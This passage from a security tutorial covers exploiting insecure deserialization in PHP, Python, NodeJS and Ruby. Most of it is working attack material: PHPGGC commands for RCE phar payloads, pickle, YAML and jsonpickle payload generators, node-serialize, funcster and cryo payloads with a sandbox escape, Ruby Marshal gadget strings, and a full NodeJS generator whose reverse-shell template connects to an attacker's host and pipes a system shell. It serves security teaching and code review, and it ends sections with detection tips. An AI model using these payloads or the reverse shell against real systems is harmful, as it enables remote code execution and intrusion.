Studying the output, it is possible to see that both the `__construct` and `__destruct` are called. If deserialized, it would produce the following output:

```bash
$ php php-desert.php -d
[+] New Desert created! Hello Sahara!
[+] Bye Bye Sahara
```

That's interesting. The __construct was not considered at all, and of course, the __toString was not called as well. This clearly shows that the most reliable methods to be used for deserialization exploitation are:

* `__wekeup`
* `__destruct`

As they are the only two methods that will be surely executed on an object during deserialization. All the others, even if exploitable in some situation, are tied to the application implementation and may, or may not, be called on an object.

If the FileDelete class was seriliazed instead, it should be noticed that, upon deserialization, the file name test would be deleted. Of course, as no input validation is implemented, the reader may try to exploit an arbitrary (carefully) file. Instead, if the RCE class is serialized:

```bash
$ php php-desert.php -e rce
$ php php-desert.php -d
```
A calculator will spawn on the hosting server.

To have additional reading about PHP deserialization, the following walkthrough may be of interest: 

* [https://klezVirus.github.io/reviews/vulnhub/raven2](https://klezVirus.github.io/reviews/vulnhub/raven2)

This walkthrough is part of a series [HTB and VulnHub, an OSWE Approach](https://klezvirus.github.io/HTB_VulnHub_an_OSWE_approach/)

##### PHP: PHAR Driven Deserialization

Another interesting feature of PHP, is that deserialization may be triggered by certain special conditions, such as loading object using PHP Wrappers.

In the following paragraph, it will be shown how to exploit serialization triggered by a file operation made with "phar://". Of course, in order to be exploitable, an attacker may be able control the file used during the file operation. 
The logical flow can be summarised as following:

1. User Provided input: $file = "phar://evil.phar/evil"
2. Implemented function: $phar = fopen -> read: $file, file_get_contents: $file
3. Call induced by phar://: $obj = unserialize($phar)
4. Call induced by unserialize: $obj.__wakeup()
5. Call induced by unserialize: $obj.__destruct()

The logical flow, above, shows that the only two possible vectors for this kind of exploitation are: `__destruct` and `__wakeup`, as they are the only two called during the deserialization induced by the `phar://` wrapper.

The following snippet provides an example of vulnerable code. As observable, there is no class implemented within the PHP file, but Slim, Yii and Guzzle are installed and required via the vendor autoload script.

```php
<?php
error_reporting(0);
// Requiring Slim, Yii and Guzzle (mod version) to enable visibility over POP gadgets
// php composer.phar yii/yii:1.1.20
// php composer.phar require slim/slim:3.8.1
// php composer.phar require guzzlehttp/guzzle:6.0.1 (re-unpatched version)
require 'vendor/autoload.php';

// Function vulnerable to phar:// deserialization
function vulnerable_to_phar($filename){
    echo("[*] Open file: $filename"); 
    $content = file_get_contents($filename);
    //print($content); // Enable this line to use Slim RCE
}

// Function vulnerable to RCE via insecure deserialization
function vulnerable_to_rce_via_gadgets($filename){
    echo("[*] Deserializing: $filename"); 
    $desert = unserialize(file_get_contents($filename));
    print($desert);
}
// Getting args from stdin
$args = getopt("f:p");
$file = $args["f"] or die("[-] Filename is required");

// Executing vulnerable functions
if(is_bool($args["p"])){
    vulnerable_to_phar($file);
}else{
    vulnerable_to_rce_via_gadgets($file);
}
?>
```
Taking a closer look at the file, it is evident that the potential vulnerabilities are two. One of them is exploitable via normal deserialization, while the other via deserialization induced by `phar://`.
This time, instead of searching suitable classes manually, a very handy tool will be used, called **PHPGGC**.

#### Generate payloads dynamically: PHPGGC

In the previous section, it was stated that it is not really feasible to generalise the exploitation of PHP application using POP gadget chains. However, within the years, a good number of POP gadgets (framework specific), have been identified and collected in an unofficial PHP version of ysoserial, [PHPGGC](https://github.com/ambionics/phpggc).

As ysoserial, this is an extremely powerful tool, which can automatically create gadget chains for many different PHP frameworks, such as:

* Drupal7
* Wordpress
* ZendFramework
* Slim
* Laravel
* Magento
* Guzzle
* ... others

As mentioned, the example application uses Slim, Guzzle and Yii. Conveniently, the three are among **PHPGCC** supported gadget chains:

```bash
$ phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                        TYPE             VECTOR         I
Guzzle/RCE1                               6.0.0 <= 6.3.2                 rce              __destruct     *
Slim/RCE1                                 3.8.1                          rce              __toString
Yii/RCE1                                  1.1.20                         rce              __wakeup       *

```

To exploit the deserialization induced by `phar://`, a malicious phar file must be generated, then passed to application using the phar wrapper as part of the name. The phar wrapper will force the file to be deserialized, starting a POP chain that will eventually lead to RCE. A valid payload may be generated using the following command:

```bash
$ phpggc Guzzle/RCE1 "shell_exec" "cmd /c calc" -p phar -pf desert -o desert.phar
```
Then, the payload can be tested launching the vulnerable script, giving as input the payload, prefixed with the phar wrapper:

```bash
$ php php-wrap-desert.php -fphar://desert.phar/desert -p
```

Doing that will spawn a calculator on the hosting machine.

The other serialization vulnerability can be exploited in a similar way, the only things to notice is the following:

Even though PHPGGC has a Slim RCE gadget chain, if the print function is disabled (commented), it won't work. It may be obvious, but Slim uses `__toString` to trigger the POP chain, hence it won't be able to do that without a string operation. To try it, create a payload like the following:

```bash
$ phpggc Slim/RCE1 "system" "cmd /c calc" -o desert.bin
```

Try to run it, via the following command:

```bash
$ php php-wrap-desert.php -fdesert.bin
```
Nothing will happen. Enabling the print function and retrying, a calculator will spawn on the hosting machine.

#### Tips for Source Code reviewers

To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: 

* `unserialize`
* `__wakeup`
* `__destruct`

For each match of `unserialize`, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker. After that, a research of suitable classes for exploitation might start with researching for  `__wakeup` and `__destruct` calls.

---

### Python

Python as well offers built-in support for serialization/deserialization, with many libraries that can easily marshal an object using different archive-formats, as binary, XML, JSON, YAML, and so on.
Within the years, a few modules were found to be affected by unsafe deserialization issues. Those were:

* pickle, handling binary serialization 
* pyYAML, handling YAML serialization
* jsonpickle, handling JSON serialization

#### Python: Binary Archive Format

In Python, the main library handling Binary serialization is Pickle (provided in different packages, as cPickle, pickle and _pickle). This library is known to be affected by an RCE upon deserialization.

Considering the following piece of code:

```python
import os
import _pickle

class Desert(object):
    def __init__(self, name, width, heigth):
        self.name = name
        self.width = width
        self.height = height

    def __reduce__(self):
        return Desert("Gobi", 8, 10)

# The application insecurely deserializes a file
def desert_deserialize(filename):
    with open(filename, "r") as desert_file:
        _pickle.loads(desert_file)

if __name__ == '__main__':
    desert = desert_deserialize()

```

As you can see, pickle `load()` function is called without any prior check on the file content, allowing an attacker to pass an arbitrary binary payload to the application.

How can that be exploited? In Python, no tool like ysoserial is available, and there is no clear definition of POP gadget as it was for the previous analysed languages, but in this context, there is no need for them at all.

Indeed, for pickle, _pickle and cPickle, a payload may be crafted using a simple piece of code, like the following:

```python
import _pickle

class Payload(object):
    def __reduce__(self):
        return (os.system, ('whoami',))

def serialize_exploit():
    shellcode = _pickle.dumps(Exploit())
    return shellcode

```

Changing the return function, it would be possible to generate the payload needed to execute different commands. However, it is more than possible to create something way more general than this, using various techniques, the first we'll see is known as dynamic class generation, code below:

```python
import os
import _pickle
import sys

def Payload:
    pass

    def __reduce__(self):
        pass

def _patch(bytestream):
    byte_array = bytearray(bytestream)
    byte_array[-4] = int("52", 16)
    return bytes(byte_array)

def generate_class(name=None, methods=None):
    if not name:
        return None
    elif not methods:
        return None
    else:
        return type(name, (object,), methods)()

def serialize_class(commands):
    if not commands:
        print(f"[-] No command provided")
    else:
        methods = {
            "__reduce__": lambda self: (os.system, (commands,))
        }
        cls = generate_class("Payload", methods)
        return cls.__reduce__()

command = " ".join(sys.argv[1:])
print(f"[+] Generating serialized object for:")
print(f"    {command}")

with open("payload", "wb") as payload:
    payload.write(_patch(_pickle.dumps(serialize_class(command))))

```

As you may notice, a function called `_patch` is applied to the serialized object, applying a patch to the binary archive after serialization. This trick has been used because the lambda function, although being bound to the attribute `__reduce__` is not interpreted as the reduce method, but as a lambda function:

* Static definition

```
>>> print(Payload.__getattribute__(Payload(), "__reduce__"))
<bound method Payload.__reduce__ of <__main__.Payload object at 0x00000209218B9518>>
```

* Dynamic definition

```
>>> cls = generate_class("Payload", methods)
>>> print(cls.__getattribute__("__reduce__"))
<bound method serialize_class.<locals>.<lambda> of <__main__.Payload object at 0x00000209218B9080>>
```

Although that would not stop the serialization, it would cause the payload to not be executed upon deserialization. However, the `_patch` function successfully fix this issue at byte-code level, making the payload executable again.

There is, however, a nicer way of achieving the same results, keeping the good part (setting arbitrary commands), and avoiding the bad one (dynamic class definition and patching), but it will be showed later, as well as a complete payload generator for both binary and text-based formats.

#### Python: Text-Based Archive Format

Several different libraries are offered by Python which support text-based serialization archives, such as json (or simplejson), or ETree (for XML). Even though most of these libraries are known to be secure, a few of them are susceptible to this kind of attack. In the following paragraphs, a brief explaination is given about how the text-based serialization works, how to exploit it, and how to generate custom payloads.

**YAML**

PyYAML, as its name suggests, it is a library to handle the YAML format. As previously stated, it was found to be vulnerable to deserialization issues.

The following example shows a very simple object being serialized from the python console:

```python
>>> yaml.dump([{"a":"b"}])
'- a: b\n'
>>> yaml.dump([{"a":("b","c")}])
'- a: !!python/tuple\n  - b\n  - c\n'
```

Analyse the serialized object is not difficult, dict and lists are handled nicely, while other object must be serialized with their class notation. The above object, for example, would be translated as:

```python
-                 ==== [ 
a :!!python/tuple ==== {a : tuple(
- b - c           ==== b, c
                  ==== )}
                  ==== ]
```

In order to serialize an arbitrary class, the `__reduce__` method must be implemented, in a similar way it was for pickle.

How does the exploitation works? Considering the following vulnerable code:

```python
import yaml

# Try to create the desert object from YAML file
with open('desert.yml') as desert_file:
    if float(yaml.__version__) <= 5.1: 
        desert = yaml.load(desert_file)
    else:
        desert = yaml.unsafe_load(desert_file)
# Try printing the desert name
print(desert['name'])
```

The careful reader may appreciate the version check before the actual call to `load`. This was done on purpose because from PyYAML >= 5.1, the `load` function was patched to avoid "function" deserialization (e.g. `os.system`, `subprocess.call`, `subprocess.check_output`). However, it may still be possible to exploit it using non function based vectors as `subprocess.Popen`. A very nice explaination on that can be found [here](https://www.exploit-db.com/docs/47655).
The main concept is the always the same: tricking the application into loading arbitrary classes/methods. In the case of PyYAML, the following payload can be used to spawn a calculator on the hosting server:

```yaml
!!python/object/apply:nt.system
- cmd /c calc
```

This simple payload can be easily created using the following code:

```python
import yaml, os

class Payload:
    def __reduce__(self):
        return (os.system, ("cmd /c calc.exe",))
    
yaml.dump(Payload())
```

**JSON**

The same vulnerability already studied in pickle can be applied to jsonpickle. As the name may suggest, the jsonpickle module is actually a json library built on top of pickle. The deserialization issue is located in the `decode()` function call, as it may be seen in the following vulnerable code snippet:

```python
import jsonpickle

with open("payload.json", "r") as payload:
    jsonpickle.decode(payload.read())
```

Analysing the function call using a tracing function, it is possible to see that the module calls actually the vulnerable function `loads`. To confirm that, the following snippet may be used:

```python
import sys
import jsonpickle
import re


def trace(frame, event, arg):
    if event != 'call':
        return
    c_object = frame.f_code
    func_name = c_object.co_name
    if not re.search(r"load", func_name):
        return
    func_name_line_no = frame.f_lineno
    func_filename = c_object.co_filename
    caller = frame.f_back
    caller_line_no = caller.f_lineno
    caller_filename = caller.f_code.co_filename
    print('Call to {0} on line {1} of {2} from line {3} of {4}'.format(func_name, func_name_line_no, func_filename,caller_line_no, caller_filename))


with open("payload.json", "r") as payload:
    sys.settrace(trace)
    jsonpickle.decode(payload.read())

```

Which would produce the following results:

```
$ python tracer.py

Call to loads on line 299 of C:\Users\amagnosi\AppData\Local\Programs\Python\Python37\lib\json\__init__.py from line 207 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\backend.py
Call to loadclass on line 600 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\unpickler.py from line 326 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\unpickler.py
```

As for the previous two modules, the serialization process uses `__reduce__` to create the serialized representation of the object. Generate a working exploit is as easy as it was for PyYAML, and can be done using the following code:

```python
import jsonpickle

class Payload:
    def __reduce__(self):
        return (os.system, ("cmd /c calc.exe",))
    
jsonpickle.encode(Payload())
```

That's seems interesting, but it would be nicer to generate serialized payloads without rewriting the code anytime a different command is needed, right? Below, a way to dynamically generate valid payloads for all the python modules listed above is presented.

#### Generate payloads dynamically: deser-py

The following tool, called **deser-py**, can be used to generate different payloads for pickle, yaml and jsonpickle. An updated version of the tool can be also downloaded [here](https://github.com/klezVirus/deser-py).

```python
import os
import _pickle
import subprocess
import jsonpickle
import sys
import yaml
import argparse


class Payload:
    def __init__(self, commands, vector=None):
        self.vector = vector
        self.commands = commands

    def __reduce__(self):
        if self.vector == "os":
            return os.system, (self.commands,)
        elif self.vector == "subprocess":
            return subprocess.Popen, (self.commands,)


def print_available_formats():
    available_formats = {
        "pickle": "Format for cPickle and _pickle modules",
        "json": "Format for jsonpickle module",
        "yaml": "Format for PyYAML module"
        }
    for k, v in available_formats.items():
        print(f"    {k}: {v}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='deser-py - A simple serialization payload generator', add_help=True)

    parser.add_argument(
        '-d', '--debug', required=False, action='store_true', default=False,
        help='Enable debug messages')
    parser.add_argument(
        '-s', '--save', required=False, action='store_true', default=False,
        help='Save payload to file')
    parser.add_argument(
        '-v', '--vector', required=False, choices=["os", "subprocess"], default="os",
        help='Save payload to file')
    parser.add_argument(
        '-f', '--format', required=True, choices=["pickle", "json", "yaml", "#"], default="#",
        help='Serialization archive format')
    parser.add_argument(
        '-c', '--command', type=str, required=False, default=None, help='Command for the payload')

    args = parser.parse_args()

    if args.format == "#":
        print(f"[*] The following format are accepted:")
        print_available_formats()
        sys.exit()
    if not args.command:
        print(f"[-] A command (-c) is required to generate the payload")
    command = args.command

    print(f"[+] Generating serialized object for:")
    print(f"    {command}")
    cls = Payload(command, args.vector)

    if args.format == "pickle":
        if args.save:
            with open("payload.bin", "wb") as payload:
                payload.write(_pickle.dumps(cls))
        else:
            print(f"[+] Final Payload:\n    {_pickle.dumps(cls)}")
    elif args.format == "json":
        if args.save:
            with open("payload.json", "w") as payload:
                payload.write(jsonpickle.encode(cls))
        else:
            print(f"[+] Final Payload:\n    {jsonpickle.encode(cls)}")
    elif args.format == "yaml":
        if args.save:
            with open("payload.yml", "w") as payload:
                yaml.dump(cls, payload)
        else:
            p = yaml.dump(cls).replace('\n', '\n    ')
            print(f"[+] Final Payload:\n    {p}")
    else:
        sys.exit()
```

The functions provided by this simple tool can be inspected using the help:

```bash
$ python PayloadGenerator.py -h
usage: PayloadGenerator.py [-h] [-d] [-s] [-v {os,subprocess}] -f {pickle,json,yaml,#} [-c COMMAND]

PayloadGenerator - A simple serialization payload generator

optional arguments:
  -h, --help            show this help message and exit
  -d, --debug           Enable debug messages
  -s, --save            Save payload to file
  -v {os,subprocess}, --vector {os,subprocess}
                        Save payload to file
  -f {pickle,json,yaml,#}, --format {pickle,json,yaml,#}
                        Serialization archive format
  -c COMMAND, --command COMMAND
                        Command for the payload

```

To test payloads, and for simplicity, the following vulnerable code can be used:

```python
import _pickle
import sys
import yaml
import jsonpickle

if sys.argv[1] == "b":
    with open("payload.bin", "rb") as payload:
        _pickle.loads(payload.read())
elif sys.argv[1] == "y":
    with open("payload.yml", "r") as payload:
        if float(yaml.__version__) <= 5.1: 
            yaml.load(payload)
        else:
            yaml.unsafe_load(payload)
elif sys.argv[1] == "j":
    with open("payload.json", "r") as payload:
        jsonpickle.decode(payload.read())
```

To generate a valid payload for jsonpickle, for example, the following command can be used:

```bash
$ python PayloadGenerator.py -f json -v os -c "cmd /c calc"
[+] Generating serialized object for:
    cmd /c calc
[+] Final Payload:
    {"py/reduce": [{"py/function": "nt.system"}, {"py/tuple": ["cmd /c calc"]}]}
```

#### Tips for Source Code reviewers

To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: 

* `(loads|load|unsafe_load|decode)\s*\(`
* `([p|P]ickle|yaml)`

For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.

---

### NodeJS

In NodeJS, serialization is handled by many different modules, which allow to marshal arbitrary complex objects in JSON-like format. A few of them, which were found to be susceptible to deserialization issues, are of interest for this article, and are:

* node-serialize
* serialize-to-js
* funcster

Before starting digging into the vulnerabilities, it should be clear to the reader that this kind of issues in JavaScript behave way differently in comparison to previous examples. No POP gadget chain is required to trigger RCE or sort of. Why so? Usually, bug of this type in JavaScript arises because the serialized payload is passed to functions like `eval()`, or `new Function()`, which implies that arbitrary code may be executed by the application.

#### NodeJS: Text-based archive format

**node-serialize**

The first NodeJS module under analysis is `node-serialize`. In 2017, a researcher named **Ajin Abraham** found that this module allowed deserialization of function objects in a non-safe way, leading to RCE. 

If tested, it is possible to see that `node-serialize` serializes objects using regular JSON format. The question that may arise would be, why not JSON.stringify(), then? The reason being that JSON cannot really serialize functions.

For this reason, if an object containing a functional literal is serialized with `JSON.stringify`, the literal would be lost:

```js
node -e "console.log(JSON.stringify({'a':function(){console.log('HELLO!');}}));"

{}
```

While if serialized with `node-serialize`, the result would be the following:

```js
$ node -e "console.log(require('node-serialize').serialize({'a':function(){console.log('HELLO!');}}));"

{"a":"_$$ND_FUNC$$_function(){console.log('HELLO!');}"}
```

The problem arises, of course, during the deserialization process, because to reverse the function back, `node-serialize` would pass any object prefixed with `_$$ND_FUNC$$_` to `eval`, as can be seen from the following snippet:

```js
// https://github.com/luin/serialize/blob/master/lib/serialize.js
75. if(obj[key].indexOf(FUNCFLAG) === 0) {
76.     obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
77. }
```

Which meanse that if a serialized object, like the following, is deserialized by node-deserialize:

```js
{"rce":"_$$ND_FUNC$$_function() { CMD = \"cmd /c calc\"; require('child_process').exec(CMD, function(error, stdout, stderr) { console.log(stdout) }); }()"}
```

The application would execute an arbitrary command on the target machine (in this case, spawn a calculator on a Windows box).

**funcster**

The `funcster` module is also affected by a deserialization vulnerability. However, this time, the vulnerability is triggered via `module.exports` and executed within a sandboxed environment:

```js
// https://github.com/jeffomatic/funcster/blob/master/js/lib/funcster.js
83. _generateModuleScript: function(serializedFunctions) {
84.      var body, entries, name;
85.      entries = [];
86.      for (name in serializedFunctions) {
87.        body = serializedFunctions[name];
88.        entries.push("" + (JSON.stringify(name)) + ": " + body);
89.      }
90.      entries = entries.join(',');
91.      return "module.exports=(function(module,exports){return{" + entries + "};})();";
92.    },
...
141. vm.createScript(script, opts.filename).runInNewContext(sandbox);
142. return sandbox.module.exports;
```

For this reason, it is not possible to call a function as `require()` directly. However, the process is still exploitable via sandbox bypassing. The common technique to achieve that is to access global objects via `this.constructor.costructor`. This payload can be used to achieve RCE on an application using `require('funcster').unserialize()`:

```js
{"rce":{"__js_function":"function(){CMD=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()"}}
```

**cryo**

The last module analysed is `cryo`. This library, as explicitly stated on the module website, extends the JSON functionalities offering complex object and function serialization.

This library is not directly vulnerable to RCE via deserialization, because it properly handles function and complex objects. However, it allows for object prototypes redefinition. As the reader may know, any object in JavaScript holds is own properties and methods. Usually, it's not possible to add properties to an existing object constructor, however, JavaScript prototype allows to add/redefine properties or methods at runtime, without adding them via the default constructor. Additionally, it is possible to access the `Object.prototype` property using the `__proto__` property.

The `__proto__` property of Object.prototype is an accessor property (a getter function and a setter function) that exposes the internal [[Prototype]] (either an object or null) of the object through which it is accessed.

Manipulating the `__proto__` property, then, it may be possible to overwrite/redefine standard methods of the object to deserialize, such as `toString()` or `valueOf()`. In that case, what would happen if the following JSON payload was deserialized?

```js
{
    "root":"_CRYO_REF_2",
    "references":[{
        "contents":{},
        "value":"_CRYO_FUNCTION_function(){ CMD = \"cmd /c calc\"; const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD, function(error, stdout, stderr) { console.log(stdout) });}()"
    },
    {
        "contents":{"toString":"_CRYO_REF_0"},
        "value":"_CRYO_OBJECT_" },
    {
        "contents":{"__proto__":"_CRYO_REF_1"},
        "value":"_CRYO_OBJECT_"        
    }]
}
```

During deserialization, cryo would redefine the `toString()` function, via `__proto__` accessor. If later on the application tried calling the `toString()` method of the deserialized object, the RCE function would be called instead.
Of course, any object method may be overwritten, `toString` is just an example.

#### Generate payloads dynamically: deser-node

As for other languages, it would be handy to have a tool to automatically generate suitable payloads. In order to do that, the following script was created, named **desert-node**. The tool can be used to generate different payloads for the libraries prensented in this article. An updated version of the tool can also be downloaded [here](https://github.com/klezVirus/deser-node).

```js
/**
* This script provides a simple cli to generate payloads for:
* - node-serialize
* - funcster
* - cryo
*
* It's not meant to be a complete tool, but just a proof of concept
**/
var fs = require('fs');

var argv = require('yargs')
    .usage('Usage: $0 -f [file] [options]')
    .alias('f', 'file')
    .alias('m', 'mode')
    .alias('s', 'serializer')
    .alias('v', 'vector')
    .alias('c', 'command')
    .alias('H', 'lhost')
    .alias('P', 'lport')
    .alias('t', 'target')
    .alias('p', 'cryoprototype')
    .alias('h', 'help')
    .choices('s', [, 'ns', 'fstr', 'cryo'])
    .choices('m', ['serialize', 'deserialize'])
    .choices('v', ['rce', 'rshell'])
    .choices('t', ['linux', 'windows'])
    .default('t', 'windows')
    .default('p', 'toString')
    .default('s', 'ns')
    .default('m', 'serialize')
    .describe('f','Input file')
    .describe('m','Operational mode, may be serialize or deserialize')
    .describe('s','The serializer module to use')
    .describe('v','The vector is command exe or reverse shell')
    .describe('c','The command to execute (-v rce must be used)')
    .describe('e','Charencode the payload (not implemented yet)')
    .describe('H','Local listener IP (-v rshell must be used)')
    .describe('P','Local listener PORT (-v rshell must be used)')
    .describe('t','Target machine OS, may be Win or Linux')
    .demandOption(['f'])
    .showHelpOnFail(false, "Specify --help for available options")
    .argv;

var payload;

// Serialize function wrap
function serialize(serializer, object) {
    if (serializer == "fstr") {
        var serialize = require('funcster');
        return JSON.stringify(serialize.deepSerialize(object),null,0);
    } else if (serializer == "ns") {
        return require('node-serialize').serialize(object);
    } else if (argv.serializer == "cryo") {
        return require('cryo').stringify(object);
    }
}

// Deserialize function wrap
function deserialize(serializer, object) {
    if (serializer == "fstr") {
        return require('funcster').deepDeserialize(object);
    } else if (serializer == "ns") {
        return require('node-serialize').unserialize(object);
    } else if (argv.serializer == "cryo") {
        return require('cryo').parse(object);
    }
}

/* As dynamic commands couldn't be added during serialization,
*  these tags were applied to payload templates to allow dynamic
*  configuration 
*/
cmd_tag = /####COMMAND####/g;
lhost_tag = /####LHOST####/g;
lport_tag = /####LPORT####/g;
shell_tag = /####SHELL####/g;
sentinel_tag = /\/\/####SENTINEL####\s*}/g;
proto_tag=/function_prototype/g;

//BEGIN - Payload Template Generation
if (argv.vector == "rshell" && argv.serializer != "cryo") {
    if (typeof argv.lport == 'undefined' || typeof argv.lhost == 'undefined') {
        console.log("[-] RShell vector requires LHOST and LPORT to be specified");
        process.exit();
    }
    payload = {
        rce: function() {
            var net = require('net');
            var spawn = require('child_process').spawn;
            HOST = "####LHOST####";
            PORT = "####LPORT####";
            TIMEOUT = "5000";
            if (typeof String.prototype.contains === 'undefined') {
                String.prototype.contains = function(it) {
                    return this.indexOf(it) != -1;
                };
            }

            function c(HOST, PORT) {
                var client = new net.Socket();
                client.connect(PORT, HOST, function() {
                    var sh = spawn("####SHELL####", []);
                    client.write("Connected!");
                    client.pipe(sh.stdin);
                    sh.stdout.pipe(client);
                    sh.stderr.pipe(client);
                    sh.on('exit', function(code, signal) {
                        client.end("Disconnected!");
                    });
                });
                client.on('error', function(e) {
                    setTimeout(c(HOST, PORT), TIMEOUT);
                });
            }
            c(HOST, PORT);//####SENTINEL####
        }
    }
} else if (argv.vector == "rshell" && argv.serializer == "cryo") {
    if (typeof argv.lport == 'undefined' || typeof argv.lhost == 'undefined') {
        console.log("[-] RShell vector requires LHOST and LPORT to be specified");
        process.exit();
    }
    payload = {
        __proto: {
            function_prototype: function() {
                var net = require('net');
                var spawn = require('child_process').spawn;
                HOST = "####LHOST####";
                PORT = "####LPORT####";
                TIMEOUT = "5000";
                if (typeof String.prototype.contains === 'undefined') {
                    String.prototype.contains = function(it) {
                        return this.indexOf(it) != -1;
                    };
                }

                function c(HOST, PORT) {
                    var client = new net.Socket();
                    client.connect(PORT, HOST, function() {
                        var sh = spawn('####SHELL####', []);
                        client.write("Connected!");
                        client.pipe(sh.stdin);
                        sh.stdout.pipe(client);
                        sh.stderr.pipe(client);
                        sh.on('exit', function(code, signal) {
                            client.end("Disconnected!");
                        });
                    });
                    client.on('error', function(e) {
                        setTimeout(c(HOST, PORT), TIMEOUT);
                    });
                }
                c(HOST, PORT);//####SENTINEL####
            }
        }
    }
} else if (argv.vector == "rce" && argv.serializer != "cryo") {
    if (typeof argv.command == 'undefined') {
        console.log("[-] RCE vector requires a command to be specified");
        process.exit();
    }
    payload = {
        rce: function() {
            CMD = "####COMMAND####";
            require('child_process').exec(CMD, function(error, stdout, stderr) {
                console.log(stdout)
            });//####SENTINEL####
        },
    }
} else if (argv.vector == "rce" && argv.serializer == "cryo") {
    if (typeof argv.command == 'undefined') {
        console.log("[-] RCE vector requires a command to be specified");
        process.exit();
    }
    payload = {
        __proto: {
            function_prototype: function() {
                CMD = "####COMMAND####";
                require('child_process').exec(CMD, function(error, stdout, stderr) {
                    console.log(stdout)
                });//####SENTINEL####
            }
        }
    }
} else {
    payload = {
        rce: function() {
            require('child_process').exec('cmd /c calc', function(error, stdout, stderr) {
                console.log(stdout)
            });//####SENTINEL####
        },
    }
}
//END - Payload Template Generation

//BEGIN - Payload Customization
if (argv.mode == "serialize") {
    var serialized_object = serialize(argv.serializer, payload);
    if (argv.serializer == "cryo") {
        // Prototype rewriting
        serialized_object = serialized_object.replace("__proto", "__proto__");
    }
    // Beautify
    serialized_object = serialized_object.replace(/(\\t|\\n)/gmi, "");
    serialized_object = serialized_object.replace(/(\s+)/gmi," ");
    // Setting up CMD (if applicable)
    serialized_object = serialized_object.replace(cmd_tag, argv.command);
    // Setting up RSHELL (if applicable)
    serialized_object = serialized_object.replace(lhost_tag, argv.lhost);
    serialized_object = serialized_object.replace(lport_tag, argv.lport);
    // Setting up shell basing on OS
    if (argv.target == "windows") {
        serialized_object = serialized_object.replace(shell_tag, "cmd");
    } else if (argv.target == "linux") {
        serialized_object = serialized_object.replace(shell_tag, "/bin/sh");
    }
    // Making payload executable with "()"
    if(serialized_object.includes("####SENTINEL####")){
        serialized_object = serialized_object.replace(sentinel_tag, '}()');
    } else {
        serialized_object = serialized_object.replace('"}}', '()"}}');
    }
    if (argv.serializer == "fstr" || argv.serializer == "cryo") {
        if(argv.serializer == "cryo"){
            serialized_object = serialized_object.replace(proto_tag, argv.cryoprototype);
        }
        if (argv.vector == "rce") {
            // Modifying RCE payload to bypass the sandbox via this.constructor.constructor
            serialized_object = serialized_object.replace("require('child_process')", "const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process')");
        } else if (argv.vector == "rshell") {
            // Modifying RSHELL payload to bypass the sandbox via this.constructor.constructor
            serialized_object = serialized_object.replace("var net=require('net');var spawn=require('child_process').spawn;", "const process = this.constructor.constructor('return this.process')();var spawn=process.mainModule.require('child_process').spawn;var net=process.mainModule.require('net');");
            serialized_object = serialized_object.replace("var net = require('net');var spawn = require('child_process').spawn;", "const process = this.constructor.constructor('return this.process')();var spawn=process.mainModule.require('child_process').spawn;var net=process.mainModule.require('net');");
        }
    }
    // Debug check
    console.log(serialized_object);
    // Storing on file
    fs.writeFile(argv.file, serialized_object, function(err) {
        if (err) throw err;
        console.log('[+] Serializing payload');
    });
} else if (argv.mode == "deserialize") {
    // Reading payload from file
    fs.readFile(argv.file, function(err, data) {
        if (err) throw err;
        console.log('[+] Deserializing payload');
        var object = data;
        // cryo handles JSON directly - no need to JSON.parse
        if (argv.serializer != "cryo") {
            object = JSON.parse(data);
        }
        console.log(object);
        // Triggering RCE
        var deser = deserialize(argv.serializer, object);
        // Triggering RCE for Cryo
        deser.toString();
    });
}
```

#### Tips for Source Code reviewers

For NodeJS application, it's very difficult to advice on common strategies to get this kind of issues, as many libraries exist and many may be created in the future. Even though, as a general recommendation, it is usually a good idea to start searching the code for common regexes, like: 

* `(unserialize|parse)\s*\(`
* `(node-serialize|funcster|serialize-to-js|cryo)`

For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.

---

### Ruby

Ruby, as all the programming languages seen previously, offer serialization support, both hybrid (with Marshal) and pure text-based (mainly JSON or YAML). Within the years, two main vulnerabilities were found in Ruby that allowed RCE during the deserialization process. The affected functions were:

* Marshal.load()
* YAML.load()

#### Ruby: Binary Archive Format

**Marshal**

Originally, this vulnerability was found by **Charlie Somerville** during a research against Ruby on Rails, which leaded to the discovery of a gadget chain based on the `rails` module. However, the chain as it was, presented some major drawbacks:

* ActiveSupport gem must be loaded
* ERB from stdlib must be loaded
* After deserialization, a method that doesn't exist must be called on the deserialized object

The above fallbacks doesn't affect the payload from working within Ruby on Rails app, as the requirements are easily fulfilled. However, they would be show stoppers for any other Ruby Application. To test it, the following command might be used, seeing that it works only if `rails/all` had been previously loaded:

* Without `require 'rails/all'`

```bash
$ ruby -e 'Marshal.load("\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\u000E@instanceo:\bERB\u0006:\t@srcI\"\u0018eval(`puts \"TEST\"`)\u0006:\u0006ET:\f@method:\vresult")'

Traceback (most recent call last):
        1: from -e:1:in `<main>'
-e:1:in `load': undefined class/module ActiveSupport:: (ArgumentError)
```
* With `require 'rails/all'`

```bash
$ ruby -e 'require "rails/all";Marshal.load("\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\u000E@instanceo:\bERB\u0006:\t@srcI\"\u0018eval(`puts \"TEST\"`)\u0006:\u0006ET:\f@method:\vresult")'

# May result in TypeError: Implicit Conversion of nil to int (in this case downgrade Ruby)
TEST
```

However, a relatively new research, made by **Luke Jahnke**, lead to the discovery of a POP gadget chain working with Ruby standard libs only, without any previous requirement and not relying on any additional module.

As described in the original research, which can be found [here](https://www.elttam.com/blog/ruby-deserialization/), the POP gadget chain is built leveraging functions which then results in the `Kernel.open` being called with an arbitrary command. The full execution path can be summarised as following:

